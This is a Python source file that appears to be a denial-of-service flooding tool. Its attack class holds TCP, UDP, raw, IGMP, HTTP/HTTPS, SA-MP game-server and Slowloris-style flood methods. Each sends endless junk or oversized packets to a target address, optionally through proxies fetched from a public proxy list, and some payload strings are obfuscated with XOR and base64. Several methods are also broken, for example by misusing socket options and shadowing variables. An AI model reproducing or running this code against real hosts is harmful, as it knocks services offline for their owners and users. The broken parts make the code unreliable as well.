# Importing necessary libraries
#import os
#from os import system as _sys 
#import sys
#import time
#from time import sleep as wait 
import socket
import random
import base64 as b64
import codecs
import ssl
import requests

# XOR Decryption
def xor_dec(string,key):
            letter = b64.b64decode( string.encode() ).decode()
            lkey = len(key)
            string = []
            num = 0
            for each in letter:
                if num >= lkey:
                    num = num % lkey
                string.append(chr(ord(each)^ord(key[num])))
                num += 1
            return "".join(string)

# Variable
useragents = [""]
ref = [""]
acceptall = [""]

key = "asdfghjkloiuytresxcvbnmliuytf"
packets = [
codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),
codecs.decode("53414d509538e1a9611e63","hex_codec"),
codecs.decode("53414d509538e1a9611e69","hex_codec"),
codecs.decode("53414d509538e1a9611e72","hex_codec"),
codecs.decode("081e62da","hex_codec"),
codecs.decode("081e77da","hex_codec"),
codecs.decode("081e4dda","hex_codec"),
codecs.decode("021efd40","hex_codec"),
codecs.decode("021efd40","hex_codec"),
codecs.decode("081e7eda","hex_codec")
]
junk_strings = [
      xor_dec('IBwdBwoJSgkDGwcQDVU=', key),
      xor_dec('LBIAA0cKE0siChEAClRURT8dBhkMX19f', key),
      xor_dec('BgEBAxMSSh8DTyglLQNBRU9L', key),
      xor_dec('CQcQFhRSRUQLBh0dDBZcBhwVTDgHFhgWEw8D', key),
      xor_dec('CFMDCRNIAg4AAwhVGxsdERYKEA==', key),
      xor_dec('MicgRgEEBQQITwsUGw1TRFI=', key),
      xor_dec('CRIMB0cKCwUIGAABEVQVClMaEQQQHB8eGwcLBhQTARYUFRoY', key),
      xor_dec('JTcLNUcJHh8NDAJU', key),
      xor_dec('IBwdBwoJSgkDGwcQDVQAChATEFc=', key)
]

# Creating a function to handle proxies
def getProxies():
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000&country=all&ssl=all&anonymity=all')
    proxies_content = res.content
    proxies = random.choice(proxies_content).strip().split(':')
    return proxies

# Creating a class to handle attack function
class attackHandler():
    class Method():
        def _TCP(ip : str, port : int, packets : int, use_proxy : bool):
            try:
                while True:
                    for _ in range(packets):
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        if use_proxy == True:
                            proxy = getProxies()
                            s.connect((str(proxy[0]), int(proxy[1])))
                        else:
                            s.connect((ip, port))
                        get_host = "GET /?" + str(random.randint(0,50000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
                        connection = "Connection: Keep-Alive\r\n"
                        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
                        accept = random.choice(acceptall)
                        response = get_host + useragent + accept + connection
                        byte_packet = random.randint(120000, 900000)
                        byte = random._urandom(byte_packet)
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.send(str.encode(response))
                        s.sendall(str.encode(response))
                        s.send(byte)
                        s.sendall(byte)
                        for _ in range(packets):
                            s.send(str.encode(response))
                            s.sendall(str.encode(response))
                            s.send(byte)
                            s.sendall(byte)
            except socket.error:
                s.close()
        def _UDP(ip : str, port : int, packets : int, use_proxy : bool):
            try:
                while True:
                    for _ in range(packets):
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        if use_proxy == True:
                            proxy = getProxies()
                            s.connect((str(proxy[0]), int(proxy[1])))
                        else:
                            s.connect((ip, port))
                        get_host = "GET /?" + str(random.randint(0,50000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
                        connection = "Connection: Keep-Alive\r\n"
                        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
                        accept = random.choice(acceptall)
                        response = get_host + useragent + accept + connection
                        byte_packet = random.randint(120000, 900000)
                        byte = random._urandom(byte_packet)
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.send(str.encode(response))
                        s.sendall(str.encode(response))
                        s.send(byte)
                        s.sendall(byte)
                        for _ in range(packets):
                            s.send(str.encode(response))
                            s.sendall(str.encode(response))
                            s.send(byte)
                            s.sendall(byte)
            except socket.error:
                s.close()
        def _RAW(ip : str, port : int, packets : int, use_proxy : bool):
            try:
                while True:
                    for _ in range(packets):
                        random_ip = str(random.randint(0,255)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255)) + '.' + str(random.randint(0,255))
                        s = socket.socket(socket.AF_INET, socket.SOCK_RAW)
                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                        if use_proxy == True:
                            proxy = getProxies()
                            s.connect((str(proxy[0]), int(proxy[1])))
                        else:
                            s.connect((ip, port))
                        response = "GET /" + random_ip + " HTTP/1.1\r\n"
                        response += "Host: " + random_ip + "\r\n\r\n"
                        byte_packet = random.randint(120000, 900000)
                        byte = random._urandom(byte_packet)
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.send(str.encode(response))
                        s.sendall(str.encode(response))
                        s.send(byte)
                        s.sendall(byte)
                        for _ in range(packets):
                            s.send(str.encode(response))
                            s.sendall(str.encode(response))
                            s.send(byte)
                            s.sendall(byte)
            except socket.error:
                s.close()
        def _SAMP(ip : str, port : int, packets : int, use_proxy : bool):
            while True:
              for _ in range(packets):
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                if use_proxy == True:
                    proxy = getProxies()
                    s.connect((str(proxy[0]), int(proxy[1])))
                else:
                    s.connect((ip, port))
                pack = packets[random.randrange(0,3)]
                s.send(pack)
                if(int(port) == 7777):
                  s.send(packets[5])
                elif(int(port) == 7796):
                  s.send(packets[4])
                elif(int(port) == 7771):
                  s.send(packets[6])
                elif(int(port) == 7784):
                  s.send(packets[7])
                elif(int(port) == 1111):
                  s.send(packets[9]) 
        def _IGMP(ip : str, port : int, packets : int, use_proxy : bool):
            while True:
                try:
                    for _ in range(packets):
                        byte = random._urandom(random.randint(600000, 900000))
                        s = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
                        if use_proxy == True:
                            proxy = getProxies()
                            s.connect((str(proxy[0]), int(proxy[1])))
                        else:
                            s.connect((ip, port))
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.send(byte)
                        s.sendall(byte)
                        for y in range(packets):
                            s.send(byte)
                            s.sendall(byte)
                except socket.error:
                    s.close()
        def _STD(ip : str, port : int, packets : int, use_proxy : bool):
            while True:
                try:
                    for _ in range(packets):
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        if use_proxy == True:
                            proxy = getProxies()
                            s.connect((str(proxy[0]), int(proxy[1])))
                        else:
                            s.connect((ip, port))
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.send(random.choice(junk_strings).encode())
                        s.sendall(random.choice(junk_strings).encode())
                        for _ in range(packets):
                            s.send(random.choice(junk_strings).encode())
                            s.sendall(random.choice(junk_strings).encode())
                except:
                    s.close()
        def _CC(ip : str, port : int, packets : int, use_proxy : bool):
            while True:
                try:
                    for _ in range(packets):
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        if use_proxy == True:
                            proxy = getProxies()
                            s.connect((str(proxy[0]), int(proxy[1])))
                        else:
                            s.connect((ip, port))
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.send("\000".encode())
                except socket.error:
                    s.close()
        def _REQ(ip : str, port : int, packets : int, use_proxy : bool):
            while True:
                try:
                    for _ in range(packets):
                        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
                        accept = random.choice(acceptall)
                        referer = "Referer: https://" + ip + "\r\n" 
                        get_host = 'GET' + " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
                        connection = "Connection: Keep-Alive\r\n"
                        content = "Content-Type: application/x-www-form-urlencoded\r\n"
                        length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
                        request = get_host + useragent + accept + referer + content + length + "\r\n"
                        socks = requests.get(ip)
                        if use_proxy == True:
                            proxy = getProxies()
                            socks = requests.get(ip, headers=request, proxies=proxy)
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            socks = ctx.wrap_socket(socks, server_hostname=ip)
                        socks()
                        socks()
                        for _ in range(packets):
                            socks()
                            socks()
                except:
                    pass
        def _HTTPS(ip : str, port : int, packets : int, use_proxy : bool):
            while True:
                try:
                    for _ in range(packets):
                        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
                        accept = random.choice(acceptall)
                        referer = "Referer: https://" + ip + "\r\n" 
                        get_host = 'GET' + " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
                        connection = "Connection: Keep-Alive\r\n"
                        content = "Content-Type: application/x-www-form-urlencoded\r\n"
                        length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
                        request = get_host + useragent + accept + referer + content + length + "\r\n"
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY)
                        if use_proxy == True:
                            proxy = getProxies()
                            s.connect((str(proxy[0]), int(proxy[1])))
                        else:
                            s.connect((ip, port))
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.sendall(str.encode(request))
                        s.send(str.encode(request))
                        for _ in range(packets):
                            s.sendall(str.encode(request))
                            s.send(str.encode(request))
                except:
                    s.close()
        def _HTTP(ip : str, port : int, packets : int, use_proxy : bool):
            while True:
                try:
                    for _ in range(packets):
                        useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
                        accept = random.choice(acceptall)
                        referer = "Referer: " + random.choice(ref) + ip + "\r\n" 
                        get_host = 'GET' + " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
                        connection = "Connection: Keep-Alive\r\n"
                        content = "Content-Type: application/x-www-form-urlencoded\r\n"
                        length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
                        request = get_host + useragent + accept + referer + content + length + "\r\n"
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        if use_proxy == True:
                            proxy = getProxies()
                            s.connect((str(proxy[0]), int(proxy[1])))
                        else:
                            s.connect((ip, port))
                        if int(port) == 443 or ip.startswith("https://"):
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.sendall(str.encode(request))
                        s.send(str.encode(request))
                        for _ in range(packets):
                            s.sendall(str.encode(request))
                            s.send(str.encode(request))
                except:
                    s.close()
        def _SLOW(ip : str, port : int, packets : int, use_proxy : bool):
            get_host = "GET /?" + str(random.randint(0,50000)) + " HTTP/1.1\r\nHost: " + ip + "\r\n"
            connection = "Connection: Keep-Alive\r\n"
            useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
            accept = random.choice(acceptall)
            header = get_host + useragent + accept + connection
            while True:
                try:
                    for _ in range(packets):
                        socket_list = []
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        if use_proxy == True:
                            proxy = getProxies()
                            s.connect((str(proxy[0]), int(proxy[1])))
                        else:
                            s.connect((ip, port))
                        if int(port) == 443:
                            ctx = ssl.SSLContext()
                            s = ctx.wrap_socket(s, server_hostname=ip)
                        s.send(str.encode(header))
                        socket_list.append(s)
                        while True:
                            for s in list(socket_list):
                                for _ in range(packets):
                                    try:
                                        s.send("X-a: {}\r\n".format(random.randint(1, 50000)).encode("utf-8"))
                                    except:
                                        pass
                            for _ in range(packets):
                                if port == 443:
                                    s = ssl.wrap_socket(s)
                                    s.send(str.encode(header))
                                    socket_list.append(s)
                except:
                    s.close()